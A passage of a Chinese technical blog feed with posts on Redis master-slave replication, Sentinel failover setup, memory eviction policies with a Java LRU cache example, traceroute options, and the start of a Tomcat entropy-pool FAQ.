<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204708833.png" alt="image-20200817204708833"></p>
<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204716086.png" alt="image-20200817204716086"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7.启动从节点2的redis服务</span><br><span class="line">[root@ansible-web2 ~]# cd /data/application/redis/src/</span><br><span class="line">[root@ansible-web2 src]# ./redis-server ../redis.conf &amp;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">或者，配置到了系统管理工具里面直接可以以下操作</span><br><span class="line">8.重启三台redis</span><br><span class="line">[root@redis-master redis]# systemctl restart redis.service</span><br><span class="line">[root@redis-slave-1 ~]# systemctl restart redis.service</span><br><span class="line">[root@redis-slave-2 ~]# systemctl restart redis.service</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204739577.png" alt="image-20200817204739577"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">9.测试主从</span><br><span class="line">1.在master上面执行</span><br><span class="line">[root@redis-master redis]# cd src/</span><br><span class="line">[root@redis-master src]# ./redis-cli </span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; set name jack</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">"jack"</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"></span><br><span class="line">2.分别在slave-1和slave-2上面执行:</span><br><span class="line">[root@redis-slave-1 redis]# cd src/</span><br><span class="line">[root@redis-slave-1 src]# ./redis-cli </span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">"jack"</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line">[root@redis-slave-2 src]# ./redis-cli </span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">"jack"</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line">查看复制状态</span><br><span class="line">master执行：</span><br><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"><span class="meta">#</span><span class="bash"> Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:2</span><br><span class="line">slave0:ip=192.168.246.203,port=6379,state=online,offset=490,lag=0</span><br><span class="line">slave1:ip=192.168.246.204,port=6379,state=online,offset=490,lag=1</span><br><span class="line">==============================================================================</span><br><span class="line">slave上面执行：</span><br><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"><span class="meta">#</span><span class="bash"> Replication</span></span><br><span class="line">role:slave</span><br><span class="line">master_host:192.168.246.202</span><br><span class="line">master_port:6379</span><br><span class="line">master_link_status:up</span><br></pre></td></tr></table></figure>

<p>注意：从服务器一般默认禁止写入操作：slave-read-only yes</p>
<p><strong>主从同步部署完成！</strong></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis哨兵模式介绍及配置</title>
    <url>/2018/12/02/Redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="redis-sentinel—哨兵模式"><a href="#redis-sentinel—哨兵模式" class="headerlink" title="redis-sentinel—哨兵模式"></a>redis-sentinel—哨兵模式</h1><h2 id="1、哨兵简介-Redis-Sentinel"><a href="#1、哨兵简介-Redis-Sentinel" class="headerlink" title="1、哨兵简介:Redis Sentinel"></a>1、哨兵简介:Redis Sentinel</h2><p><strong>Sentinel(哨兵)是用于监控redis集群中Master状态的工具</strong>，其已经被集成在redis2.4+的版本中是Redis官方推荐的高可用性(HA)解决方案。</p>
<h2 id="2、作用"><a href="#2、作用" class="headerlink" title="2、作用"></a>2、作用</h2><p>1)：Master状态检测<br>2)：如果Master异常，则会进行Master-Slave切换，将其中一个Slave作为Master，将之前的Master作为Slave<br>3)：Master-Slave切换后，sentinel.conf的监控目标会随之调换 </p>
<h2 id="3、工作模式"><a href="#3、工作模式" class="headerlink" title="3、工作模式"></a>3、工作模式</h2><p>1)：每个Sentinel以每秒钟一次的频率向它所知的Master，Slave以及其他 Sentinel 实例发送一个 PING 命令 </p>
<p> 2)：如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 则这个实例会被 Sentinel 标记为主观下线。 </p>
<p> 3)：如果一个Master被标记为主观下线，则正在监视这个Master的所有 Sentinel 要以每秒一次的频率确认Master的确进入了主观下线状态。 </p>
<p> 4)：当有足够数量的 Sentinel（大于等于配置文件指定的值）在指定的时间范围内确认Master的确进入了主观下线状态， 则Master会被标记为客观下线 。</p>
<h2 id="4、主观下线和客观下线"><a href="#4、主观下线和客观下线" class="headerlink" title="4、主观下线和客观下线"></a>4、主观下线和客观下线</h2><p>主观下线：Subjectively Down，简称 SDOWN，指的是当前 一个Sentinel 实例对某个redis服务器做出的下线判断。<br>客观下线：Objectively Down， 简称 ODOWN，指的是多个 Sentinel 实例在对Master Server做出 SDOWN  判断，并且通过 SENTINEL is-master-down-by-addr 命令互相交流之后，得出的Master  Server下线判断，然后开启failover</p>
<h2 id="5、配置哨兵模式"><a href="#5、配置哨兵模式" class="headerlink" title="5、配置哨兵模式"></a>5、配置哨兵模式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.每台机器上修改redis主配置文件redis.conf文件设置：bind 0.0.0.0   ---已经操作</span><br><span class="line">2.每台机器上修改sentinel.conf配置文件：修改如下配置</span><br><span class="line">[root@redis-master src]# cd ..</span><br><span class="line">[root@redis-master redis]# vim sentinel.conf</span><br><span class="line">sentinel monitor mymaster 10.0.0.137 6379 2 #当集群中有2个sentinel认为master死了时，才能真正认为该master已经不可用了。 (slave上面写的是master的ip，master写自己ip)</span><br><span class="line">sentinel down-after-milliseconds mymaster 3000   #单位毫秒</span><br><span class="line">sentinel failover-timeout mymaster 10000   #若sentinel在该配置值内未能完成failover(故障转移)操作（即故障时master/slave自动切换），则认为本次failover失败。</span><br><span class="line">protected-mode no  #关闭加密模式--新添加到sentinel配置文件中</span><br><span class="line">3.每台机器启动哨兵服务：</span><br><span class="line">[root@redis-master redis]# ./src/redis-sentinel sentinel.conf </span><br><span class="line">注意:在生产环境下将哨兵模式启动放到后台执行:     ./src/redis-sentinel sentinel.conf &amp;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/02/Redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817205407224.png" alt="image-20200817205407224"></p>
<p> 将master的哨兵模式退出（Crtl+c），再将redis服务stop了，在两台slave上面查看其中一台是否切换为master:(没有优先级，为随机切换)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">^C4854:signal-handler (1564349039) Received SIGINT scheduling shutdown...</span><br><span class="line">4854:X 29 Jul 05:23:59.592 # User requested shutdown...</span><br><span class="line">4854:X 29 Jul 05:23:59.592 # Sentinel is now ready to exit, bye bye...</span><br><span class="line">[root@redis-master redis]# systemctl stop redis.service</span><br><span class="line">或者用kill命令杀死</span><br></pre></td></tr></table></figure>

<p>在slave机器上面查看:</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/02/Redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817205436742.png" alt="image-20200817205436742"></p>
<p><img src= "/img/loading.gif" data-src="/2018/12/02/Redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817205444899.png" alt="image-20200817205444899"></p>
<p>至此，哨兵模式也部署完成了</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis的内存淘汰策略问题</title>
    <url>/2019/02/03/Redis%E7%9A%84%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Redis的内存淘汰策略问题"><a href="#Redis的内存淘汰策略问题" class="headerlink" title="Redis的内存淘汰策略问题"></a>Redis的内存淘汰策略问题</h1><p>Redis是一个开源的、使用C语言编写的、支持网络交互的、基于内存的key-value数据库，因为系统的内存大小有限，所以我们在使用Redis的时候可以配置Redis能使用的最大的内存大小。</p>
<h3 id="redis的特点"><a href="#redis的特点" class="headerlink" title="redis的特点"></a>redis的特点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.丰富的数据结构 -----String,list,set,hash等数据结构的存储</span><br><span class="line">2.支持持久化</span><br><span class="line">3.支持事务 ---------------事务是指“一个完整的动作，要么全部执行，要么什么也没有做”。</span><br><span class="line">4.支持主从</span><br></pre></td></tr></table></figure>

<h2 id="Redis配置内存"><a href="#Redis配置内存" class="headerlink" title="Redis配置内存"></a>Redis配置内存</h2><h3 id="1、通过配置文件配置"><a href="#1、通过配置文件配置" class="headerlink" title="1、通过配置文件配置"></a>1、通过配置文件配置</h3><p>通过在Redis安装目录下面的redis.conf配置文件中添加以下配置设置内存大小</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//设置Redis最大占用内存大小为100M</span><br><span class="line">maxmemory</span><br><span class="line">100mb</span><br></pre></td></tr></table></figure>

<p>redis的配置文件不一定使用的是安装目录下面的redis.conf文件，启动redis服务的时候是可以传一个参 数指定redis的配置文件的</p>
<h3 id="2、通过命令修改"><a href="#2、通过命令修改" class="headerlink" title="2、通过命令修改"></a>2、通过命令修改</h3><p>Redis支持运行时通过命令动态修改内存大小</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//设置Redis最大占用内存大小为100M</span><br><span class="line">127.0.0.1:6379&gt; config set maxmemory 100mb</span><br><span class="line">//获取设置的Redis能使用的最大内存大小</span><br><span class="line">127.0.0.1:6379&gt; config get maxmemory</span><br></pre></td></tr></table></figure>

<p>如果不设置最大内存大小或者设置最大内存大小为0，在64位操作系统下不限制内存大小，在32位操作 系统下最多使用3GB内存</p>
<h2 id="Redis的内存淘汰"><a href="#Redis的内存淘汰" class="headerlink" title="Redis的内存淘汰"></a>Redis的内存淘汰</h2><p>既然可以设置Redis最大占用内存大小，那么配置的内存就有用完的时候。那在内存用完的时候，还继 续往Redis里面添加数据不就没内存可用了吗？</p>
<p>实际上Redis定义了几种策略用来处理这种情况：</p>
<p>noeviction(默认策略)：对于写请求不再提供服务，直接返回错误（DEL请求和部分特殊请求除外）</p>
<p>allkeys-lru：从所有key中使用LRU算法进行淘汰</p>
<p>volatile-lru：从设置了过期时间的key中使用LRU算法进行淘汰</p>
<p>allkeys-random：从所有key中随机淘汰数据</p>
<p>volatile-random：从设置了过期时间的key中随机淘汰</p>
<p>volatile-ttl：在设置了过期时间的key中，根据key的过期时间进行淘汰，越早过期的越优先被淘汰</p>
<p>当使用volatile-lru、volatile-random、volatile-ttl这三种策略时，如果没有key可以被淘汰，则和 noeviction一样返回错误</p>
<p>如何获取及设置内存淘汰策略</p>
<p>获取当前内存淘汰策略：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get maxmemory-policy</span><br></pre></td></tr></table></figure>

<p>通过配置文件设置淘汰策略（修改redis.conf文件）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">maxmemory-policy allkeys-lru</span><br></pre></td></tr></table></figure>

<p>通过命令修改淘汰策略：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set maxmemory-policy allkeys-lru</span><br></pre></td></tr></table></figure>

<h2 id="LRU算法"><a href="#LRU算法" class="headerlink" title="LRU算法"></a>LRU算法</h2><h3 id="什么是LRU"><a href="#什么是LRU" class="headerlink" title="什么是LRU?"></a>什么是LRU?</h3><p>上面说到了Redis可使用最大内存使用完了，是可以使用LRU算法进行内存淘汰的，那么什么是LRU算法 呢？</p>
<p>LRU(Least Recently Used)，即最近最少使用，是一种缓存置换算法。在使用内存作为缓存的时候， 缓存的大小一般是固定的。当缓存被占满，这个时候继续往缓存里面添加数据，就需要淘汰一部分老的 数据，释放内存空间用来存储新的数据。这个时候就可以使用LRU算法了。其核心思想是：如果一个数 据在最近一段时间没有被用到，那么将来被使用到的可能性也很小，所以就可以被淘汰掉。</p>
<p>如下输入7 0 1 2 0 3 0 4</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/03/Redis%E7%9A%84%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5%E9%97%AE%E9%A2%98/image-20200821101950522.png" alt="image-20200821101950522"></p>
<p>使用java实现一个简单的LRU算法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class LRUCache&lt;k, v&gt; &#123;</span><br><span class="line">&#x2F;&#x2F;容量</span><br><span class="line">private int capacity;</span><br><span class="line">&#x2F;&#x2F;当前有多少节点的统计</span><br><span class="line">private int count;</span><br><span class="line">&#x2F;&#x2F;缓存节点</span><br><span class="line">private Map&lt;k, Node&lt;k, v&gt;&gt; nodeMap;</span><br><span class="line">private Node&lt;k, v&gt; head;</span><br><span class="line">private Node&lt;k, v&gt; tail;</span><br><span class="line">public LRUCache(int capacity) &#123;</span><br><span class="line">if (capacity &lt; 1) &#123;</span><br><span class="line">throw new IllegalArgumentException(String.valueOf(capacity));</span><br><span class="line">&#125;</span><br><span class="line">this.capacity &#x3D; capacity;</span><br><span class="line">this.nodeMap &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">&#x2F;&#x2F;初始化头节点和尾节点，利用哨兵模式减少判断头结点和尾节点为空的代码</span><br><span class="line">Node headNode &#x3D; new Node(null, null);</span><br><span class="line">Node tailNode &#x3D; new Node(null, null);</span><br><span class="line">headNode.next &#x3D; tailNode;</span><br><span class="line">tailNode.pre &#x3D; headNode;</span><br><span class="line">this.head &#x3D; headNode;</span><br><span class="line">this.tail &#x3D; tailNode;</span><br><span class="line">&#125;</span><br><span class="line">public void put(k key, v value) &#123;</span><br><span class="line">Node&lt;k, v&gt; node &#x3D; nodeMap.get(key);</span><br><span class="line">if (node &#x3D;&#x3D; null) &#123;</span><br><span class="line">if (count &gt;&#x3D; capacity) &#123;</span><br><span class="line">&#x2F;&#x2F;先移除一个节点</span><br><span class="line">removeNode();</span><br><span class="line">&#125;</span><br><span class="line">node &#x3D; new Node&lt;&gt;(key, value);</span><br><span class="line">&#x2F;&#x2F;添加节点</span><br><span class="line">addNode(node);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">&#x2F;&#x2F;移动节点到头节点</span><br><span class="line">moveNodeToHead(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public Node&lt;k, v&gt; get(k key) &#123;</span><br><span class="line">Node&lt;k, v&gt; node &#x3D; nodeMap.get(key);</span><br><span class="line">if (node !&#x3D; null) &#123;</span><br><span class="line">moveNodeToHead(node);</span><br><span class="line">&#125;</span><br><span class="line">return node;</span><br><span class="line">&#125;</span><br><span class="line">private void removeNode() &#123;</span><br><span class="line">Node node &#x3D; tail.pre;</span><br><span class="line">&#x2F;&#x2F;从链表里面移除</span><br><span class="line">removeFromList(node);</span><br><span class="line">nodeMap.remove(node.key);</span><br><span class="line">count--;</span><br><span class="line">&#125;</span><br><span class="line">private void removeFromList(Node&lt;k, v&gt; node) &#123;</span><br><span class="line">Node pre &#x3D; node.pre;</span><br><span class="line">Node next &#x3D; node.next;</span><br><span class="line">pre.next &#x3D; next;</span><br><span class="line">next.pre &#x3D; pre;</span><br><span class="line">node.next &#x3D; null;</span><br><span class="line">node.pre &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line">private void addNode(Node&lt;k, v&gt; node) &#123;</span><br><span class="line">&#x2F;&#x2F;添加节点到头部</span><br><span class="line">addToHead(node);</span><br><span class="line">nodeMap.put(node.key, node);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">private void addToHead(Node&lt;k, v&gt; node) &#123;</span><br><span class="line">Node next &#x3D; head.next;</span><br><span class="line">next.pre &#x3D; node;</span><br><span class="line">node.next &#x3D; next;</span><br><span class="line">node.pre &#x3D; head;</span><br><span class="line">head.next &#x3D; node;</span><br><span class="line">&#125;</span><br><span class="line">public void moveNodeToHead(Node&lt;k, v&gt; node) &#123;</span><br><span class="line">&#x2F;&#x2F;从链表里面移除</span><br><span class="line">removeFromList(node);</span><br><span class="line">&#x2F;&#x2F;添加节点到头部</span><br><span class="line">addToHead(node);</span><br><span class="line">&#125;</span><br><span class="line">class Node&lt;k, v&gt; &#123;</span><br><span class="line">k key;</span><br><span class="line">v value;</span><br><span class="line">Node pre;</span><br><span class="line">Node next;</span><br><span class="line">public Node(k key, v value) &#123;</span><br><span class="line">this.key &#x3D; key;</span><br><span class="line">this.value &#x3D; value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码实现了一个简单的LUR算法，代码很简单，也加了注释，仔细看一下很容易就看懂。</p>
<h2 id="LRU在Redis中的实现"><a href="#LRU在Redis中的实现" class="headerlink" title="LRU在Redis中的实现"></a>LRU在Redis中的实现</h2><h3 id="近似LRU算法"><a href="#近似LRU算法" class="headerlink" title="近似LRU算法"></a>近似LRU算法</h3><p>Redis使用的是近似LRU算法，它跟常规的LRU算法还不太一样。近似LRU算法通过随机采样法淘汰数据，每次随机出5（默认）个key，从里面淘汰掉最近最少使用的key。</p>
<p>可以通过maxmemory-samples参数修改采样数量：例：maxmemory-samples 10 maxmenorysamples配置的越大，淘汰的结果越接近于严格的LRU算法</p>
<p>Redis为了实现近似LRU算法，给每个key增加了一个额外增加了一个24bit的字段，用来存储该key最后 一次被访问的时间。</p>
<h3 id="Redis3-0对近似LRU的优化"><a href="#Redis3-0对近似LRU的优化" class="headerlink" title="Redis3.0对近似LRU的优化"></a>Redis3.0对近似LRU的优化</h3><p>Redis3.0对近似LRU算法进行了一些优化。新算法会维护一个候选池（大小为16），池中的数据根据访 问时间进行排序，第一次随机选取的key都会放入池中，随后每次随机选取的key只有在访问时间小于池 中最小的时间才会放入池中，直到候选池被放满。当放满后，如果有新的key需要放入，则将池中最后 访问时间最大（最近被访问）的移除。</p>
<p>当需要淘汰的时候，则直接从池中选取最近访问时间最小（最久没被访问）的key淘汰掉就行。</p>
<h3 id="LRU算法的对比"><a href="#LRU算法的对比" class="headerlink" title="LRU算法的对比"></a>LRU算法的对比</h3><p>我们可以通过一个实验对比各LRU算法的准确率，先往Redis里面添加一定数量的数据n，使Redis可用 内存用完，再往Redis里面添加n/2的新数据，这个时候就需要淘汰掉一部分的数据，如果按照严格的 LRU算法，应该淘汰掉的是最先加入的n/2的数据。生成如下各LRU算法的对比图</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/03/Redis%E7%9A%84%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5%E9%97%AE%E9%A2%98/image-20200821102423552.png" alt="image-20200821102423552"></p>
<p>你可以看到图中有三种不同颜色的点：</p>
<ul>
<li>浅灰色是被淘汰的数据 </li>
<li>灰色是没有被淘汰掉的老数据 </li>
<li>绿色是新加入的数据</li>
</ul>
<p>我们能看到Redis3.0采样数是10生成的图最接近于严格的LRU。而同样使用5个采样数，Redis3.0也要 优于Redis2.8。</p>
<h3 id="LFU算法"><a href="#LFU算法" class="headerlink" title="LFU算法"></a>LFU算法</h3><p>LFU算法是Redis4.0里面新加的一种淘汰策略。它的全称是Least Frequently Used，它的核心思想是根 据key的最近被访问的频率进行淘汰，很少被访问的优先被淘汰，被访问的多的则被留下来。 LFU算法能更好的表示一个key被访问的热度。假如你使用的是LRU算法，一个key很久没有被访问到， 只刚刚是偶尔被访问了一次，那么它就被认为是热点数据，不会被淘汰，而有些key将来是很有可能被 访问到的则被淘汰了。如果使用LFU算法则不会出现这种情况，因为使用一次并不会使一个key成为热 点数据。</p>
<h4 id="LFU一共有两种策略："><a href="#LFU一共有两种策略：" class="headerlink" title="LFU一共有两种策略："></a>LFU一共有两种策略：</h4><p>volatile-lfu：在设置了过期时间的key中使用LFU算法淘汰key </p>
<p>allkeys-lfu：在所有的key中使用LFU算法淘汰数据 设置使用这两种淘汰策略跟前面讲的一样，不过要注意的一点是这两种策略只能在Redis4.0及以上设 置，如果在Redis4.0以下设置会报错</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>内存淘汰</tag>
      </tags>
  </entry>
  <entry>
    <title>Traceroute命令详解（路由连接状态检测）</title>
    <url>/2018/08/01/Traceroute%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%B7%AF%E7%94%B1%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。</p>
<h5 id="常见命令参数："><a href="#常见命令参数：" class="headerlink" title="常见命令参数："></a>常见命令参数：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  traceroute [ -46dFITnreAUDV ] [ -f first_ttl ] [ -g gate,... ] [ -i device ] [ -m max_ttl ] [ -N squeries ] [ -p port ] [ -t tos ] [ -l flow_label ] [ -w waittime ] [ -q nqueries ] [ -s src_addr ] [ -z sendwait ] [ --fwmark=num ] host [ packetlen ]</span><br><span class="line">Options:</span><br><span class="line">  -4                          Use IPv4</span><br><span class="line">  -6                          Use IPv6</span><br><span class="line">  -d  --debug                 Enable socket level debugging</span><br><span class="line">  -F  --dont-fragment         Do not fragment packets</span><br><span class="line">  -f first_ttl  --first=first_ttl</span><br><span class="line">                              Start from the first_ttl hop (instead from 1)</span><br><span class="line">  -g gate,...  --gateway=gate,...</span><br><span class="line">                              Route packets through the specified gateway</span><br><span class="line">                              (maximum 8 for IPv4 and 127 for IPv6)</span><br><span class="line">  -I  --icmp                  Use ICMP ECHO for tracerouting</span><br><span class="line">  -T  --tcp                   Use TCP SYN for tracerouting (default port is 80)</span><br><span class="line">  -i device  --interface=device</span><br><span class="line">                              Specify a network interface to operate with</span><br><span class="line">  -m max_ttl  --max-hops=max_ttl</span><br><span class="line">                              Set the max number of hops (max TTL to be</span><br><span class="line">                              reached). Default is 30</span><br><span class="line">  -N squeries  --sim-queries=squeries</span><br><span class="line">                              Set the number of probes to be tried</span><br><span class="line">                              simultaneously (default is 16)</span><br><span class="line">  -n                          Do not resolve IP addresses to their domain names</span><br><span class="line">  -p port  --port=port        Set the destination port to use. It is either</span><br><span class="line">                              initial udp port value for "default" method</span><br><span class="line">                              (incremented by each probe, default is 33434), or</span><br><span class="line">                              initial seq for "icmp" (incremented as well,</span><br><span class="line">                              default from 1), or some constant destination</span><br><span class="line">                              port for other methods (with default of 80 for</span><br><span class="line">                              "tcp", 53 for "udp", etc.)</span><br><span class="line">  -t tos  --tos=tos           Set the TOS (IPv4 type of service) or TC (IPv6</span><br><span class="line">                              traffic class) value for outgoing packets</span><br><span class="line">  -l flow_label  --flowlabel=flow_label</span><br><span class="line">                              Use specified flow_label for IPv6 packets</span><br><span class="line">  -w waittime  --wait=waittime</span><br><span class="line">                              Set the number of seconds to wait for response to</span><br><span class="line">                              a probe (default is 5.0). Non-integer (float</span><br><span class="line">                              point) values allowed too</span><br><span class="line">  -q nqueries  --queries=nqueries</span><br><span class="line">                              Set the number of probes per each hop. Default is</span><br><span class="line">                              3</span><br><span class="line">  -r                          Bypass the normal routing and send directly to a</span><br><span class="line">                              host on an attached network</span><br><span class="line">  -s src_addr  --source=src_addr</span><br><span class="line">                              Use source src_addr for outgoing packets</span><br><span class="line">  -z sendwait  --sendwait=sendwait</span><br><span class="line">                              Minimal time interval between probes (default 0).</span><br><span class="line">                              If the value is more than 10, then it specifies a</span><br><span class="line">                              number in milliseconds, else it is a number of</span><br><span class="line">                              seconds (float point values allowed too)</span><br><span class="line">  -e  --extensions            Show ICMP extensions (if present), including MPLS</span><br><span class="line">  -A  --as-path-lookups       Perform AS path lookups in routing registries and</span><br><span class="line">                              print results directly after the corresponding</span><br><span class="line">                              addresses</span><br><span class="line">  -M name  --module=name      Use specified module (either builtin or external)</span><br><span class="line">                              for traceroute operations. Most methods have</span><br><span class="line">                              their shortcuts (`-I' means `-M icmp' etc.)</span><br><span class="line">  -O OPTS,...  --options=OPTS,...</span><br><span class="line">                              Use module-specific option OPTS for the</span><br><span class="line">                              traceroute module. Several OPTS allowed,</span><br><span class="line">                              separated by comma. If OPTS is "help", print info</span><br><span class="line">                              about available options</span><br><span class="line">  --sport=num                 Use source port num for outgoing packets. Implies</span><br><span class="line">                              `-N 1'</span><br><span class="line">  --fwmark=num                Set firewall mark for outgoing packets</span><br><span class="line">  -U  --udp                   Use UDP to particular port for tracerouting</span><br><span class="line">                              (instead of increasing the port per each probe),</span><br><span class="line">                              default port is 53</span><br><span class="line">  -UL                         Use UDPLITE for tracerouting (default dest port</span><br><span class="line">                              is 53)</span><br><span class="line">  -D  --dccp                  Use DCCP Request for tracerouting (default port</span><br><span class="line">                              is 33434)</span><br><span class="line">  -P prot  --protocol=prot    Use raw packet of protocol prot for tracerouting</span><br><span class="line">  --mtu                       Discover MTU along the path being traced. Implies</span><br><span class="line">                              `-F -N 1'</span><br><span class="line">  --back                      Guess the number of hops in the backward path and</span><br><span class="line">                              print if it differs</span><br><span class="line">  -V  --version               Print version info and exit</span><br><span class="line">  --help                      Read this help and exit</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">+     host          The host to traceroute to</span><br><span class="line">      packetlen     The full packet length (default is the length of an IP</span><br><span class="line">                    header plus 40). Can be ignored or increased to a minimal</span><br><span class="line">                    allowed value</span><br></pre></td></tr></table></figure>

<h5 id="常见命令展示："><a href="#常见命令展示：" class="headerlink" title="常见命令展示："></a>常见命令展示：</h5><p><img src= "/img/loading.gif" data-src="/2018/08/01/Traceroute%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%B7%AF%E7%94%B1%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%EF%BC%89/image-20200817171600237.png" alt="image-20200817171600237"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：</span><br><span class="line">-n 显示IP地址，不查主机名，  -m 设置跳数  </span><br><span class="line"></span><br><span class="line">-q 4每个网关发送4个数据包    -w 把对外发探测包的等待响应时间设置为3秒</span><br></pre></td></tr></table></figure>

<p>也可以绕过对应的路由表，直接发送到网络相连的主机，一般都是不可行的</p>
<p><img src= "/img/loading.gif" data-src="/2018/08/01/Traceroute%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%B7%AF%E7%94%B1%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%EF%BC%89/image-20200817171904758.png" alt="image-20200817171904758"></p>
]]></content>
      <categories>
        <category>traceroute</category>
      </categories>
      <tags>
        <tag>Traceroute</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat熵池耗尽解决方案</title>
    <url>/2019/03/01/Tomcat%E7%86%B5%E6%B1%A0%E8%80%97%E5%B0%BD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>FAQ</strong>：admin启动成功后api启动慢</p>
<p><strong>1.admin</strong>启动成功后api启动日志不更新</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/01/Tomcat%E7%86%B5%E6%B1%A0%E8%80%97%E5%B0%BD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200821103851639.png" alt="image-20200821103851639"></p>
<p><strong>2.</strong>端口8005启动慢</p>
